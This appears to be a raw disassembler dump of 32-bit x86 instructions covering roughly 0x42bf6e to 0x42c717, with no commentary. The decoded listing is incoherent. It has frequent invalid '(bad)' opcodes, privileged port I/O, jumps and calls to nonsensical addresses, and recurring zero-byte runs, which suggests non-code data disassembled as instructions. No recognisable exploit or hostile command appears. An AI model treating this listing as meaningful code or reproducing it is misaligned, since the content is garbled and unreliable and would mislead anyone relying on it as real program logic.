  42bf6e:	add    BYTE PTR [eax],al
  42bf70:	sbb    DWORD PTR [edi-0x4],edx
  42bf73:	jb     0x42bf9b
  42bf75:	fst    st(2)
  42bf77:	pop    esi
  42bf78:	mov    ds:0xfb3efada,eax
  42bf7d:	sar    DWORD PTR [edx-0x15],1
  42bf80:	inc    esp
  42bf81:	mov    bh,0x83
  42bf83:	and    al,BYTE PTR [ecx]
  42bf85:	test   BYTE PTR [ecx+ebp*8-0x4499fd8a],al
  42bf8c:	jae    0x42bfe4
  42bf8e:	in     al,0x91
  42bf90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bf91:	mov    bh,0xe7
  42bf93:	mov    al,0x65
  42bf95:	(bad)  
  42bf97:	jb     0x42bfe4
  42bf99:	(bad)  
  42bf9a:	mov    WORD PTR [esi+ecx*8-0x31d980b1],gs
  42bfa1:	xor    al,0x87
  42bfa3:	das    
  42bfa4:	xchg   DWORD PTR es:[ebp+ebp*8-0x62],eax
  42bfa9:	cmp    bl,0xf6
  42bfac:	sahf   
  42bfad:	cmp    DWORD PTR [edi-0x41238b8b],0x53
  42bfb4:	sub    BYTE PTR [ebp-0x15d63a8c],cl
  42bfba:	sbb    eax,0x8cdc9e5a
  42bfbf:	and    al,0x89
  42bfc1:	dec    edi
  42bfc2:	push   ebx
  42bfc3:	jb     0x42bf7c
  42bfc5:	dec    edi
  42bfc6:	xchg   DWORD PTR [edi*2+0x5eb57de7],esp
  42bfcd:	fadd   QWORD PTR [ebx-0x31f1a57]
  42bfd3:	stos   BYTE PTR es:[edi],al
  42bfd4:	add    BYTE PTR [eax],al
  42bfd6:	add    BYTE PTR [eax],al
  42bfd8:	add    bl,al
  42bfda:	push   edx
  42bfdb:	lea    edx,[edx*2-0x341717c9]
  42bfe2:	(bad)  
  42bfe4:	pop    esp
  42bfe5:	mov    ah,0xa
  42bfe7:	push   eax
  42bfe8:	add    BYTE PTR [ebx+0x5f],ah
  42bfeb:	rcl    DWORD PTR [eax-0x39],0x41
  42bfef:	or     al,0xe8
  42bff1:	jge    0x42bfdd
  42bff3:	cmc    
  42bff4:	call   DWORD PTR [eax-0x65fd913a]
  42bffa:	(bad)  
  42bffb:	jle    0x42bfd8
  42bffd:	inc    eax
  42bffe:	fprem1 
  42c000:	jne    0x42c016
  42c002:	pusha  
  42c003:	dec    esp
  42c004:	fcomp  QWORD PTR [edi+0x4fe8f59e]
  42c00a:	mov    dl,0xf5
  42c00c:	(bad)  
  42c00d:	cmp    edx,DWORD PTR [ecx+0x8]
  42c010:	call   0x387a74
  42c015:	push   edi
  42c016:	push   ecx
  42c017:	lock pop edi
  42c019:	mov    bh,0x5f
  42c01b:	inc    esp
  42c01c:	or     al,0x67
  42c01e:	fimul  WORD PTR [edx-0x1]
  42c021:	or     eax,0x20681db
  42c026:	in     al,dx
  42c027:	dec    edx
  42c028:	or     bh,bh
  42c02a:	ret    0xc958
  42c02d:	mov    ds,esi
  42c02f:	cli    
  42c030:	push   esp
  42c031:	pop    ss
  42c032:	mov    edx,0x844ec7f
  42c037:	add    BYTE PTR [eax],al
  42c039:	jg     0x42c001
  42c03b:	xor    al,BYTE PTR [ebp+0x0]
  42c03e:	add    BYTE PTR [eax],al
  42c040:	add    BYTE PTR [eax],al
  42c042:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c043:	aaa    
  42c044:	pop    es
  42c045:	xchg   ebp,eax
  42c046:	fdiv   QWORD PTR [eax]
  42c048:	dec    edi
  42c049:	(bad)  
  42c04a:	loope  0x42c0ba
  42c04c:	idiv   edi
  42c04e:	mov    ebx,0x2ce843c3
  42c053:	pop    edx
  42c054:	cmp    eax,DWORD PTR [eax]
  42c056:	ffreep st(1)
  42c058:	push   ebp
  42c059:	call   0x3a1827
  42c05e:	xchg   BYTE PTR [edi-0x73],ah
  42c061:	jne    0x42c07f
  42c063:	dec    edx
  42c064:	call   0xe73c35eb
  42c069:	cli    
  42c06a:	(bad)  
  42c06b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c06c:	dec    esi
  42c06d:	(bad)  
  42c06e:	clc    
  42c06f:	(bad)  
  42c071:	cli    
  42c072:	cmp    bh,ah
  42c074:	stos   BYTE PTR es:[edi],al
  42c075:	add    BYTE PTR [ebp-0x15],dh
  42c078:	jle    0x42c006
  42c07a:	call   0x233da85e
  42c07f:	push   ecx
  42c080:	ret    0xd3e7
  42c083:	fsubrp st(5),st
  42c085:	cli    
  42c086:	inc    esi
  42c087:	xor    al,0x2a
  42c089:	ret    
  42c08a:	jp     0x42c0f3
  42c08c:	(bad)  
  42c08d:	inc    DWORD PTR [edx]
  42c08f:	in     al,dx
  42c090:	xor    edi,0xb77aecfa
  42c096:	jne    0x42c083
  42c098:	(bad)  
  42c099:	gs push edi
  42c09b:	ds jo  0x42c062
  42c09e:	cmp    eax,0xcdec6852
  42c0a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c0a4:	je     0x42c0a1
  42c0a6:	add    BYTE PTR [eax],al
  42c0a8:	add    BYTE PTR [eax],al
  42c0aa:	add    dl,dl
  42c0ac:	inc    ax
  42c0ae:	clc    
  42c0af:	and    eax,0xf0530381
  42c0b4:	outs   dx,BYTE PTR ds:[esi]
  42c0b5:	imul   edi,ebx,0xffffffba
  42c0b8:	fmul   QWORD PTR [ebp+0x4f]
  42c0bb:	cld    
  42c0bc:	jbe    0x42c0a4
  42c0be:	mov    BYTE PTR [eax],ch
  42c0c0:	xlat   BYTE PTR ds:[ebx]
  42c0c1:	call   0x3f1e21da
  42c0c6:	add    al,dh
  42c0c8:	stos   DWORD PTR es:[edi],eax
  42c0c9:	push   0x14
  42c0cb:	add    BYTE PTR [edi],ch
  42c0cd:	lock dec edi
  42c0cf:	and    ah,BYTE PTR [eax-0x42]
  42c0d2:	dec    edi
  42c0d3:	lock inc esi
  42c0d5:	in     al,dx
  42c0d6:	out    0x8c,eax
  42c0d8:	mov    ebp,0x94a6fae7
  42c0dd:	fdiv   st(6),st
  42c0df:	mul    DWORD PTR [edx+0x2b888e8]
  42c0e5:	cdq    
  42c0e6:	test   DWORD PTR [edx-0x23],esp
  42c0e9:	adc    edx,DWORD PTR [ebx+ebx*8]
  42c0ec:	or     ah,BYTE PTR [edi+edi*1+0x45]
  42c0f0:	xor    eax,0x3269e939
  42c0f5:	fild   DWORD PTR [ebx+0x75]
  42c0f8:	and    DWORD PTR [eax+edi*8+0x6f643c98],0xd8813a01
  42c103:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c104:	frstor [ecx+0x7d]
  42c107:	xor    al,0x8b
  42c109:	mov    ds:0x414701eb,eax
  42c10e:	jnp    0x42c110
  42c110:	add    BYTE PTR [eax],al
  42c112:	add    BYTE PTR [eax],al
  42c114:	mov    cl,0xb2
  42c116:	pop    ebx
  42c117:	jg     0x42c0a7
  42c119:	fild   WORD PTR [ecx-0x17]
  42c11c:	in     eax,dx
  42c11d:	inc    esi
  42c11e:	adc    eax,0x5fda3977
  42c123:	aas    
  42c124:	leave  
  42c125:	mov    fs,WORD PTR [ebx+0x58]
  42c128:	loopne 0x42c106
  42c12a:	and    DWORD PTR [eax+ebp*8+0x4e],edx
  42c12e:	cmp    ecx,eax
  42c130:	cmp    DWORD PTR [edx+0x27503eb],edi
  42c136:	and    bh,BYTE PTR [edi]
  42c138:	aad    0x2
  42c13a:	jmp    0xa4083642
  42c13f:	fbstp  TBYTE PTR [eax-0x62fc1724]
  42c145:	test   BYTE PTR [ecx-0x18],bh
  42c148:	lahf   
  42c149:	mov    BYTE PTR [ebx-0x28],al
  42c14c:	dec    ebx
  42c14d:	ret    0x3f20
  42c150:	jge    0x42c15f
  42c152:	jl     0x42c117
  42c154:	or     eax,edx
  42c156:	inc    esp
  42c157:	fadd   st(7),st
  42c159:	iret   
  42c15a:	shr    eax,0x1f
  42c15d:	cmp    al,0x1e
  42c15f:	mov    ebx,0xe9000730
  42c164:	mov    ebx,0x4a68eb83
  42c169:	mov    ch,bh
  42c16b:	call   0x36950ce6
  42c170:	mov    bl,0x35
  42c172:	lea    ebx,[ecx+esi*8]
  42c175:	xor    ebp,eax
  42c177:	or     al,0x0
  42c179:	add    BYTE PTR [eax],al
  42c17b:	add    BYTE PTR [eax],al
  42c17d:	(bad)  
  42c17e:	xlat   BYTE PTR ds:[ebx]
  42c17f:	cli    
  42c180:	mov    edx,0xa7874d29
  42c185:	(bad)  
  42c186:	lea    edi,[ecx+esi*8+0x31fad913]
  42c18d:	js     0x42c191
  42c18f:	add    BYTE PTR [ecx+0x3e],ch
  42c192:	mov    eax,ds:0x5d1d5e1b
  42c197:	clc    
  42c198:	push   esi
  42c199:	or     eax,0x76eb0b80
  42c19e:	add    dh,BYTE PTR [edi]
  42c1a0:	sub    bh,ch
  42c1a2:	jg     0x42c1a7
  42c1a4:	jmp    0x42c21c
  42c1a6:	add    al,BYTE PTR [edi+0x14d7462e]
  42c1ac:	jge    0x42c136
  42c1ae:	inc    edx
  42c1af:	add    BYTE PTR [eax-0x65],dh
  42c1b2:	mov    dl,0x36
  42c1b4:	sub    cl,ch
  42c1b6:	jg     0x42c1a7
  42c1b8:	call   0xb7a8c433
  42c1bd:	dec    ebx
  42c1be:	pop    esi
  42c1bf:	les    esp,FWORD PTR [ecx-0x18efd62]
  42c1c5:	call   0xd056:0x9d99c284
  42c1cc:	out    dx,al
  42c1cd:	jo     0x42c179
  42c1cf:	or     eax,0xbf137129
  42c1d4:	out    dx,al
  42c1d5:	adc    al,bl
  42c1d7:	add    cl,ch
  42c1d9:	jbe    0x42c226
  42c1db:	dec    edi
  42c1dc:	pop    esp
  42c1dd:	cmp    al,0xde
  42c1df:	push   eax
  42c1e0:	add    BYTE PTR [eax],al
  42c1e2:	add    BYTE PTR [eax],al
  42c1e4:	add    BYTE PTR [eax],al
  42c1e6:	add    DWORD PTR [ecx],ebx
  42c1e8:	loopne 0x42c23b
  42c1ea:	xor    esi,DWORD PTR [esi-0x7dac3f7d]
  42c1f0:	scas   al,BYTE PTR es:[edi]
  42c1f1:	add    DWORD PTR [edi+edi*8-0x7e],ecx
  42c1f5:	inc    ebp
  42c1f6:	in     al,dx
  42c1f7:	push   esi
  42c1f8:	add    ecx,DWORD PTR [ebp-0x72b33177]
  42c1fe:	mov    DWORD PTR [edx+0x49d5504c],ebx
  42c204:	clc    
  42c205:	call   FWORD PTR [ebp+0x62]
  42c208:	test   eax,eax
  42c20a:	and    eax,DWORD PTR [edx-0xe3fe8f]
  42c210:	add    BYTE PTR [ebp-0x14],0x56
  42c214:	add    ecx,DWORD PTR [ebp-0x72b33527]
  42c21a:	leave  
  42c21b:	mov    esi,0x300c6a4c
  42c220:	div    DWORD PTR [ebp+0x44]
  42c223:	jecxz  0x42c298
  42c225:	int3   
  42c226:	fsubr  st(3),st
  42c228:	dec    edi
  42c229:	cmp    BYTE PTR [ecx-0x3a],bl
  42c22c:	add    eax,0x61185
  42c231:	add    BYTE PTR [edi+0x69],cl
  42c234:	rol    BYTE PTR [ebx+eiz*8],0x81
  42c238:	xor    al,0x1
  42c23a:	fdiv   st(6),st
  42c23c:	add    BYTE PTR [ebp-0x78],0x57
  42c240:	add    ecx,DWORD PTR [ebp+0x684cb709]
  42c246:	int3   
  42c247:	(bad)  
  42c248:	pop    ds
  42c249:	add    BYTE PTR [eax],al
  42c24b:	add    BYTE PTR [eax],al
  42c24d:	add    BYTE PTR [eax],al
  42c24f:	or     al,0xe4
  42c251:	dec    edi
  42c252:	cmp    BYTE PTR [ecx],bl
  42c254:	mov    BYTE PTR ds:0x5ac85,0x0
  42c25b:	daa    
  42c25c:	inc    edx
  42c25d:	call   0x549c46ed
  42c262:	enter  0x1775,0x4f
  42c266:	push   eax
  42c267:	sbb    BYTE PTR [ecx],0x20
  42c26a:	test   DWORD PTR [ebp+0x74007fd3],esi
  42c270:	jmp    0x42c270
  42c272:	xchg   BYTE PTR [eax-0xff88a3d],dh
  42c278:	out    dx,al
  42c279:	(bad)  
  42c27a:	dec    ebp
  42c27b:	(bad)  
  42c27c:	mov    al,ds:0x78a5c86f
  42c281:	push   ebx
  42c282:	dec    esp
  42c283:	lock stos DWORD PTR es:[edi],eax
  42c285:	icebp  
  42c286:	test   BYTE PTR [ebp-0x14],cl
  42c289:	(bad)  
  42c28a:	(bad)  
  42c28b:	out    dx,al
  42c28c:	es enter 0xd088,0x5b
  42c291:	sub    al,0x18
  42c293:	jp     0x42c2fe
  42c295:	iret   
  42c296:	jmp    DWORD PTR [edx]
  42c298:	in     al,dx
  42c299:	jnp    0x42c2f7
  42c29b:	adc    DWORD PTR [ebp+0x38],edx
  42c29e:	in     al,0x0
  42c2a0:	mov    al,0x3
  42c2a2:	add    al,0xfc
  42c2a4:	mov    gs,edx
  42c2a6:	cmp    BYTE PTR [ebx-0x237e0e21],ah
  42c2ac:	jmp    0x42c2ac
  42c2ae:	(bad)  
  42c2af:	cld    
  42c2b0:	jbe    0x42c284
  42c2b2:	xchg   BYTE PTR [eax],al
  42c2b4:	add    BYTE PTR [eax],al
  42c2b6:	add    BYTE PTR [eax],al
  42c2b8:	imul   esp,ebx,0xfffffffd
  42c2bb:	jl     0x42c28e
  42c2bd:	ffree  st(5)
  42c2bf:	xchg   BYTE PTR [edx-0x52],dh
  42c2c2:	add    al,0x0
  42c2c4:	jbe    0x42c281
  42c2c6:	push   0x25
  42c2c8:	cmp    eax,0x3a875776
  42c2cd:	jecxz  0x42c327
  42c2cf:	inc    eax
  42c2d0:	and    eax,0x86701000
  42c2d5:	stos   DWORD PTR es:[edi],eax
  42c2d6:	inc    BYTE PTR [ebp+esi*4+0x2afb4857]
  42c2dd:	jecxz  0x42c35c
  42c2df:	(bad)  
  42c2e0:	call   0xe9ea:0x8d377402
  42c2e7:	ror    DWORD PTR [edi-0x6433a127],1
  42c2ed:	adc    DWORD PTR [esi+0x3d],ebx
  42c2f0:	ins    DWORD PTR es:[edi],dx
  42c2f1:	ins    BYTE PTR es:[edi],dx
  42c2f2:	sub    DWORD PTR [esi+ebp*2-0x11],edx
  42c2f6:	dec    esp
  42c2f7:	adc    DWORD PTR [ebp-0x193b93fe],esi
  42c2fd:	sbb    eax,0x856d6daa
  42c302:	mov    al,0xe5
  42c304:	fadd   DWORD PTR [edx]
  42c306:	xchg   ecx,eax
  42c307:	mov    edx,0x7991d93f
  42c30c:	dec    edx
  42c30d:	jg     0x42c298
  42c30f:	jo     0x42c380
  42c311:	xor    DWORD PTR [esi-0x44],esp
  42c314:	das    
  42c315:	xchg   DWORD PTR [ebx],ebp
  42c317:	in     al,dx
  42c318:	adc    dh,BYTE PTR [esi+0xe597]
  42c31e:	add    BYTE PTR [eax],al
  42c320:	add    BYTE PTR [edi],bl
  42c322:	mov    WORD PTR [eax+0x4f760d4d],ss
  42c328:	in     eax,0xf
  42c32a:	jle    0x42c369
  42c32c:	jo     0x42c393
  42c32e:	adc    eax,0x86a15c29
  42c333:	test   al,0x3
  42c335:	mov    ch,0x87
  42c337:	mov    bl,0xeb
  42c339:	fcmovb st,st(1)
  42c33b:	pop    ss
  42c33c:	in     eax,0xef
  42c33e:	fsubr  DWORD PTR [ebx+0x353efbef]
  42c344:	xor    DWORD PTR [ecx],0x3728f8e6
  42c34a:	(bad)  
  42c34b:	jmp    0x121c21d1
  42c350:	in     eax,0x93
  42c352:	mov    ebp,0xd8b93f5d
  42c357:	jp     0x42c354
  42c359:	sti    
  42c35a:	or     DWORD PTR [ecx-0x5ba1c],ebx
  42c360:	cmc    
  42c361:	arpl   dx,dx
  42c363:	xchg   BYTE PTR [edx+esi*4-0xa26b381],ah
  42c36a:	cmp    eax,0xa5dede4
  42c36f:	or     ebp,DWORD PTR [ebx+0x45]
  42c372:	(bad)  
  42c374:	into   
  42c375:	std    
  42c376:	inc    ebp
  42c377:	cld    
  42c378:	jb     0x42c301
  42c37a:	xor    dl,BYTE PTR [ecx-0x42]
  42c37d:	(bad)  
  42c37e:	cli    
  42c37f:	xchg   BYTE PTR [ecx+eax*2],ch
  42c382:	add    DWORD PTR [edi],0x19
  42c388:	add    BYTE PTR [eax],al
  42c38a:	push   eax
  42c38b:	xor    ecx,DWORD PTR [eax]
  42c38d:	jb     0x42c322
  42c38f:	scas   al,BYTE PTR es:[edi]
  42c390:	xchg   cl,dh
  42c392:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c393:	fist   DWORD PTR [eax-0x1f]
  42c396:	mov    ebp,0xcb8efc3e
  42c39b:	mov    edx,0xdbc6f186
  42c3a0:	push   eax
  42c3a1:	loope  0x42c350
  42c3a3:	ds loopne 0x42c408
  42c3a6:	push   ds
  42c3a7:	dec    eax
  42c3a8:	sti    
  42c3a9:	sbb    BYTE PTR [ecx],bl
  42c3ab:	add    DWORD PTR [ebp+eiz*2-0x73],0xa75e4fff
  42c3b3:	or     al,BYTE PTR [edi+0x545e0eb4]
  42c3b9:	mov    cl,0x1e
  42c3bb:	push   ebp
  42c3bc:	lock inc esi
  42c3be:	(bad)  
  42c3c0:	je     0x42c3db
  42c3c2:	shr    esi,1
  42c3c4:	mov    bh,0xdb
  42c3c6:	add    bl,BYTE PTR ss:[ebx-0x71]
  42c3ca:	sub    eax,0x4dbcbec9
  42c3cf:	jmp    0x42c351
  42c3d1:	or     eax,0xe900030a
  42c3d6:	and    eax,0x46815334
  42c3db:	repz aas 
  42c3dd:	add    BYTE PTR [ebx+edi*1+0x3dc1790],bl
  42c3e4:	call   0x46840b
  42c3e9:	mov    esp,DWORD PTR [ecx+ebx*2+0xe07c]
  42c3f0:	add    BYTE PTR [eax],al
  42c3f2:	add    BYTE PTR [ecx],ah
  42c3f4:	jecxz  0x42c3fb
  42c3f6:	test   BYTE PTR [ebx-0x3],cl
  42c3f9:	(bad)  
  42c3fa:	push   DWORD PTR [esi]
  42c3fc:	push   ss
  42c3fd:	lea    esi,[ebp-0x44]
  42c400:	push   ss
  42c401:	call   0xf6268f20
  42c406:	push   0xffffff95
  42c408:	jno    0x42c47d
  42c40a:	in     al,0x84
  42c40c:	out    0x5,al
  42c40e:	outs   dx,DWORD PTR ds:[esi]
  42c40f:	or     esp,ebx
  42c411:	add    DWORD PTR [edi],0xf469df
  42c417:	(bad)  
  42c418:	mov    ah,0x4f
  42c41a:	lea    ebx,[ecx-0x14a8b072]
  42c420:	or     eax,0xf2dc850c
  42c425:	test   BYTE PTR [edi],bl
  42c427:	sbb    eax,0x138b0003
  42c42c:	jb     0x42c479
  42c42e:	clc    
  42c42f:	jge    0x42c44c
  42c431:	not    DWORD PTR [eax+0x7c]
  42c434:	mov    DWORD PTR [edx+0xf1910f],edi
  42c43a:	add    BYTE PTR [eiz*2+0x2de18d52],cl
  42c441:	idiv   edi
  42c443:	cmp    edx,DWORD PTR [esi]
  42c445:	call   0xf6267f20
  42c44a:	mov    edx,DWORD PTR [ecx]
  42c44c:	mov    ebx,0xe3fc0881
  42c451:	dec    edi
  42c452:	or     al,0x65
  42c454:	fwait
  42c455:	cli    
  42c456:	inc    DWORD PTR [eax]
  42c458:	add    BYTE PTR [eax],al
  42c45a:	add    BYTE PTR [eax],al
  42c45c:	fdiv   QWORD PTR [ecx+0x53]
  42c45f:	in     al,dx
  42c460:	jne    0x42c3fd
  42c462:	cs sti 
  42c464:	and    al,0xcd
  42c466:	xchg   DWORD PTR [edi-0x38997e],edi
  42c46c:	stos   BYTE PTR es:[edi],al
  42c46d:	call   0x63d408fb
  42c472:	or     al,0x8d
  42c474:	inc    eax
  42c475:	fnstenv [eax+ebp*2]
  42c478:	cmc    
  42c479:	xlat   BYTE PTR ds:[ebx]
  42c47a:	add    BYTE PTR ds:0xb584f3b8,ah
  42c481:	fild   WORD PTR [edi-0x1168a5c]
  42c487:	sar    DWORD PTR [eax+0x230b03bc],0x1f
  42c48e:	fisttp WORD PTR [edi-0x10]
  42c491:	dec    di
  42c493:	sti    
  42c494:	pop    edx
  42c495:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c496:	mov    WORD PTR cs:[eax-0x6f],ax
  42c49b:	mov    esp,0xfadd747d
  42c4a0:	dec    ebp
  42c4a1:	cli    
  42c4a2:	mov    dh,0xfa
  42c4a4:	cmp    dl,BYTE PTR [ebx]
  42c4a6:	cmp    eax,0x58fe3585
  42c4ab:	xchg   DWORD PTR [eax-0x419b92a5],esi
  42c4b1:	pop    esi
  42c4b2:	cmp    al,ch
  42c4b4:	xbegin 0x5df8594a
  42c4ba:	fdivp  st(2),st
  42c4bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c4bd:	mov    cl,0xfe
  42c4bf:	xchg   BYTE PTR [eax],al
  42c4c1:	add    BYTE PTR [eax],al
  42c4c3:	add    BYTE PTR [eax],al
  42c4c5:	sub    bl,BYTE PTR [edx+0x610d5c8b]
  42c4cb:	pop    es
  42c4cc:	push   eax
  42c4cd:	bnd jp 0x42c4da
  42c4d0:	test   DWORD PTR [ebp+0x3566198e],esi
  42c4d6:	pop    esi
  42c4d7:	mov    BYTE PTR [edi],bh
  42c4d9:	(bad)  [esi+ebx*8]
  42c4dc:	dec    edi
  42c4dd:	rol    BYTE PTR [edx],cl
  42c4df:	cld    
  42c4e0:	push   ebx
  42c4e1:	jp     0x42c525
  42c4e3:	jmp    0xd791c770
  42c4e8:	nop
  42c4e9:	icebp  
  42c4ea:	inc    edx
  42c4eb:	or     esp,edx
  42c4ed:	scas   eax,DWORD PTR es:[edi]
  42c4ee:	xor    ah,BYTE PTR [esi-0x35]
  42c4f1:	scas   eax,DWORD PTR es:[edi]
  42c4f2:	xchg   DWORD PTR [ebx+0x18f69ad7],ebp
  42c4f8:	loop   0x42c499
  42c4fa:	jle    0x42c524
  42c4fc:	push   edi
  42c4fd:	jno    0x42c510
  42c4ff:	test   eax,0x2886296c
  42c504:	add    al,0x35
  42c506:	xchg   DWORD PTR [ebx],esp
  42c508:	fcom   DWORD PTR [edx+0x6fe1b90a]
  42c50e:	jmp    0x58a54a01
  42c513:	xor    eax,0xe7dae207
  42c518:	push   esi
  42c519:	imul   edx,esp,0x378ae123
  42c51f:	mov    ds:0x9a68f711,al
  42c524:	loope  0x42c565
  42c526:	mov    DWORD PTR [ebx],ebp
  42c528:	aam    0x0
  42c52a:	add    BYTE PTR [eax],al
  42c52c:	add    BYTE PTR [eax],al
  42c52e:	repz or DWORD PTR [ecx],edi
  42c531:	loope  0x42c4f8
  42c533:	or     ch,BYTE PTR [esi+0x5f]
  42c536:	adc    eax,0xfbf02389
  42c53b:	or     DWORD PTR [ecx],ebx
  42c53d:	loope  0x42c504
  42c53f:	or     bl,BYTE PTR [esi+0x47]
  42c542:	or     eax,0xe33f089
  42c547:	xor    edi,ecx
  42c549:	xchg   dl,al
  42c54b:	mov    BYTE PTR [ebx-0x25f60c25],ch
  42c551:	xchg   DWORD PTR [ebx+0x3ae141d5],eax
  42c557:	aad    0x97
  42c559:	or     edi,edx
  42c55b:	cld    
  42c55c:	call   FWORD PTR [ebp+0x620844d5]
  42c562:	xchg   edx,eax
  42c563:	into   
  42c564:	gs mov esi,0xfddea8e
  42c56a:	aam    0xd7
  42c56c:	pop    edx
  42c56d:	mov    bh,0x79
  42c56f:	retf   
  42c570:	mov    esi,0x24759eb8
  42c575:	jmp    0x7b46dbf0
  42c57a:	test   BYTE PTR [eax+eax*1+0x1],bl
  42c57e:	mov    ebx,0x9eeeface
  42c583:	cmp    bh,dl
  42c585:	out    0x95,al
  42c587:	fild   DWORD PTR ds:0xfad0e4d1
  42c58d:	(bad)  
  42c58e:	mov    ?,ebx
  42c590:	sti    
  42c591:	into   
  42c592:	add    BYTE PTR [eax],al
  42c594:	add    BYTE PTR [eax],al
  42c596:	add    BYTE PTR [ebp-0x24],dl
  42c599:	xchg   DWORD PTR [ebx-0x179a26ab],edi
  42c59f:	dec    esi
  42c5a0:	mov    bh,0xf5
  42c5a2:	mov    dh,0x55
  42c5a4:	cmp    edi,DWORD PTR [edi-0x7b33ffea]
  42c5aa:	mov    ebx,0x560b29a2
  42c5af:	js     0x42c611
  42c5b1:	test   DWORD PTR [ecx-0x6e80de5e],ebp
  42c5b7:	xchg   BYTE PTR [ebp+0x15],cl
  42c5ba:	test   BYTE PTR ds:0x3e69fe16,0x4c
  42c5c1:	je     0x42c5af
  42c5c3:	icebp  
  42c5c4:	retf   
  42c5c5:	push   edi
  42c5c6:	hlt    
  42c5c7:	jge    0x42c5b3
  42c5c9:	mov    cl,0x20
  42c5cb:	pop    ss
  42c5cc:	fstp   DWORD PTR [edx+0x2a]
  42c5cf:	push   cs
  42c5d0:	(bad)  
  42c5d1:	(bad)  
  42c5d2:	call   0x6b01fd4d
  42c5d7:	popf   
  42c5d8:	add    ah,BYTE PTR [esi+0x0]
  42c5db:	in     al,0x17
  42c5dd:	push   edi
  42c5de:	ret    
  42c5df:	or     ch,bh
  42c5e1:	in     eax,dx
  42c5e2:	cmp    edi,DWORD PTR [edx+0x2b]
  42c5e5:	cmovnp eax,DWORD PTR ds:0x2b823b5e
  42c5ed:	xor    ecx,DWORD PTR ss:[esi+edi*2-0x326d209]
  42c5f5:	popa   
  42c5f6:	add    ah,ah
  42c5f8:	out    0xd,al
  42c5fa:	add    DWORD PTR [eax],0x0
  42c5fd:	add    BYTE PTR [eax],al
  42c5ff:	add    BYTE PTR [ebp+0x26],dh
  42c602:	jne    0x42c619
  42c604:	xchg   edi,ecx
  42c606:	pusha  
  42c607:	and    DWORD PTR [ebp-0x8ea9107],0xffffffb9
  42c60e:	add    al,0xf
  42c610:	jmp    0x42c5d7
  42c612:	mov    esi,DWORD PTR [edx+edx*4-0x71]
  42c616:	jns    0x42c5da
  42c618:	mov    es,WORD PTR [edi+ebp*4]
  42c61b:	or     bl,bh
  42c61d:	mov    ch,0x2a
  42c61f:	jae    0x42c65a
  42c621:	pop    esp
  42c622:	test   ecx,ecx
  42c624:	test   al,0xff
  42c626:	jp     0x42c5f0
  42c628:	dec    ebp
  42c629:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c62a:	cld    
  42c62b:	jae    0x42c688
  42c62d:	lods   al,BYTE PTR ds:[esi]
  42c62e:	fsubr  st,st(3)
  42c630:	pop    edi
  42c631:	imul   ecx,DWORD PTR [eax],0x55ebc558
  42c637:	ret    
  42c638:	jns    0x42c5c1
  42c63a:	out    0x83,al
  42c63c:	mov    al,0xce
  42c63e:	dec    ecx
  42c63f:	push   esi
  42c640:	mov    ebp,edi
  42c642:	test   BYTE PTR [ebx+0x87cf59c],0x18
  42c649:	dec    ecx
  42c64a:	dec    edi
  42c64b:	push   0xfffffdd4
  42c650:	xchg   ebx,eax
  42c651:	cmp    DWORD PTR [eax],ecx
  42c653:	(bad)  
  42c654:	shl    DWORD PTR [edx-0x2a8a3b1e],0xd9
  42c65b:	cli    
  42c65c:	cld    
  42c65d:	popf   
  42c65e:	shl    BYTE PTR [esi],cl
  42c660:	mov    dl,0xcb
  42c662:	sub    BYTE PTR [edi+0x0],0x0
  42c669:	je     0x42c654
  42c66b:	inc    BYTE PTR [esi-0x880f2d0]
  42c671:	push   0xffffffb4
  42c673:	and    BYTE PTR [ebx+0x65fee974],0x6a
  42c67a:	mov    eax,0xf9c258b0
  42c67f:	push   ss
  42c680:	rol    DWORD PTR [edx+0x7500795e],cl
  42c686:	jmp    0xd45c2cbc
  42c68b:	push   edi
  42c68c:	or     al,ch
  42c68e:	ins    DWORD PTR es:[edi],dx
  42c68f:	(bad)  
  42c690:	mov    BYTE PTR [eax],bh
  42c692:	in     eax,0xe6
  42c694:	mov    WORD PTR [ecx-0x24],fs
  42c697:	(bad)  
  42c699:	push   edi
  42c69a:	dec    ax
  42c69c:	cld    
  42c69d:	and    eax,0x731bc6c1
  42c6a2:	ror    DWORD PTR [ebx-0x3cfa9ebc],0xa
  42c6a9:	stc    
  42c6aa:	inc    ecx
  42c6ab:	add    eax,0x48667500
  42c6b0:	clc    
  42c6b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c6b2:	inc    ebx
  42c6b3:	jl     0x42c6b4
  42c6b5:	dec    edx
  42c6b6:	fsubr  st(6),st
  42c6b8:	cs pop ebp
  42c6ba:	jno    0x42c695
  42c6bc:	xchg   BYTE PTR ds:0xf90ada5f,bh
  42c6c2:	and    eax,DWORD PTR ds:0x605c7500
  42c6c8:	clc    
  42c6c9:	gs loopne 0x42c64c
  42c6cc:	cmp    DWORD PTR [eax],eax
  42c6ce:	add    BYTE PTR [eax],al
  42c6d0:	add    BYTE PTR [eax],al
  42c6d2:	je     0x42c6af
  42c6d4:	inc    BYTE PTR [esi-0x17cdac48]
  42c6da:	add    DWORD PTR [edx],0xffffffb7
  42c6dd:	add    esi,DWORD PTR [ebp-0x79]
  42c6e0:	sub    BYTE PTR [esi],cl
  42c6e2:	out    dx,eax
  42c6e3:	pop    ds
  42c6e4:	call   0xcbc83bec
  42c6e9:	or     esi,DWORD PTR [ebp+0x56]
  42c6ec:	cld    
  42c6ed:	xor    eax,0x3e2aecd
  42c6f2:	jne    0x42c67a
  42c6f4:	sub    BYTE PTR [eax+0x66],bl
  42c6f7:	adc    eax,0xd641de33
  42c6fc:	adc    cl,bl
  42c6fe:	(bad)  
  42c700:	sbb    DWORD PTR [esi],esi
  42c702:	int    0xd6
  42c704:	or     ebx,esi
  42c706:	scas   eax,DWORD PTR es:[edi]
  42c707:	jge    0x42c72b
  42c709:	in     al,dx
  42c70a:	xchg   DWORD PTR [ebx],eax
  42c70c:	jmp    0xf59a6514
  42c711:	mov    DWORD PTR [ecx],esi
  42c713:	into   
  42c714:	add    BYTE PTR [edx+0x6e],bh
  42c717:	shr    cl,1
